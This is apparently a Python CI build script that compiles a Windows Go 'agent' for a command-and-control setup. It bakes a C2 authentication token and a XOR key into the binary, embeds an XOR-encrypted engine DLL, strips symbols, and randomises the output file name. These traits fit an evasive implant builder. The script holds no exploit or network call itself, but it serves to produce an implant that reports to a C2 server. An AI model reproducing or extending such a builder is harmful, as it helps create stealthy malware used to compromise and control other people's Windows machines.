#!/usr/bin/env python3
"""CI helper to build a Windows agent binary at build/agent_*.exe.

Reads build-time secrets from (in priority order):
  1. --token / --xor CLI args
  2. C2_AUTH_TOKEN / C2_AUTH_XOR environment variables
  3. Falls back to random values (only with --dev-mode; never in CI)

Both values are injected into the Go binary via -ldflags -X.
The XOR key must match the key used to encrypt agent/libjockey.enc.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import random
import secrets
import string
import subprocess
import sys
from pathlib import Path


def _random_id(length: int = 8) -> str:
    return "".join(random.choices(string.hexdigits.lower(), k=length))


def _is_hex(s: str) -> bool:
    return all(c in "0123456789abcdefABCDEF" for c in s)


def main() -> int:
    parser = argparse.ArgumentParser(description="Build agent binary for CI")
    parser.add_argument("--output-dir", "-o", default="build")
    parser.add_argument("--os", default="windows")
    parser.add_argument("--arch", default="amd64")
    parser.add_argument("--token", default=os.environ.get("C2_AUTH_TOKEN", ""))
    parser.add_argument("--xor",   default=os.environ.get("C2_AUTH_XOR", ""))
    parser.add_argument(
        "--dev-mode",
        action="store_true",
        help="Allow random token/key for local testing. NEVER use in CI.",
    )
    args = parser.parse_args()

    repo_root = Path(__file__).resolve().parent
    agent_dir = repo_root / "agent"

    output_dir = (repo_root / args.output_dir).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    suffix = ".exe" if args.os == "windows" else ""
    binary_path = output_dir / f"agent_{_random_id()}{suffix}"

    # --- resolve C2_AUTH ------------------------------------------------------
    c2_auth = args.token.strip()
    if not c2_auth:
        if args.dev_mode:
            c2_auth = secrets.token_hex(32)
            print("[!] --dev-mode: generating random C2_AUTH "
                  "(binary will NOT authenticate to the real Worker)",
                  file=sys.stderr)
        else:
            print("[-] C2_AUTH_TOKEN not set (env: C2_AUTH_TOKEN, or --token)",
                  file=sys.stderr)
            print("    Pass --dev-mode to generate a random one for local testing.",
                  file=sys.stderr)
            return 1

    # --- resolve xorKeyHex ----------------------------------------------------
    xor_key_hex = args.xor.strip()
    if not xor_key_hex:
        if args.dev_mode:
            xor_key_hex = secrets.token_hex(32)
            print("[!] --dev-mode: generating random C2_AUTH_XOR "
                  "(libjockey.enc may not decrypt if encrypted with a different key)",
                  file=sys.stderr)
        else:
            print("[-] C2_AUTH_XOR not set (env: C2_AUTH_XOR, or --xor)",
                  file=sys.stderr)
            return 1

    if len(xor_key_hex) != 64:
        print(f"[-] C2_AUTH_XOR must be 64 hex chars, got {len(xor_key_hex)}",
              file=sys.stderr)
        return 1
    if not _is_hex(xor_key_hex):
        print("[-] C2_AUTH_XOR contains non-hex characters", file=sys.stderr)
        return 1

    # --- sanity check --------------------------------------------------------
    enc_path = agent_dir / "libjockey.enc"
    if not enc_path.exists():
        print(f"[-] {enc_path} not found — cannot embed engine into agent",
              file=sys.stderr)
        print("    Build it first (see .github/workflows/build.yml step 'Encrypt engine DLL')",
              file=sys.stderr)
        return 1

    env = os.environ.copy()
    env["GOOS"] = args.os
    env["GOARCH"] = args.arch
    env["CGO_ENABLED"] = "0"

    ldflags = (
        f"-s -w "
        f"-X main.C2_AUTH={c2_auth} "
        f"-X main.xorKeyHex={xor_key_hex}"
    )

    cmd = [
        "go",
        "build",
        "-trimpath",
        "-ldflags",
        ldflags,
        "-o",
        str(binary_path),
        ".",
    ]

    print(f"[*] Building agent for {args.os}/{args.arch}")
    print(f"[+] C2_AUTH   : <{len(c2_auth)} chars>")
    print(f"[+] XOR key   : <{len(xor_key_hex)} chars>")
    print(f"[+] libjockey : {enc_path.name} "
          f"({enc_path.stat().st_size} bytes)")
    print(f"[+] Output    : {binary_path}")
    print(f"[*] Command   : go build -trimpath -ldflags <injected> -o ... .")

    result = subprocess.run(cmd, cwd=agent_dir, env=env)
    if result.returncode != 0:
        print(f"[-] go build failed (exit {result.returncode})", file=sys.stderr)
        return result.returncode

    sha256 = hashlib.sha256(binary_path.read_bytes()).hexdigest()
    print(f"[+] SHA-256   : {sha256}")
    print(f"[+] Built     : {binary_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())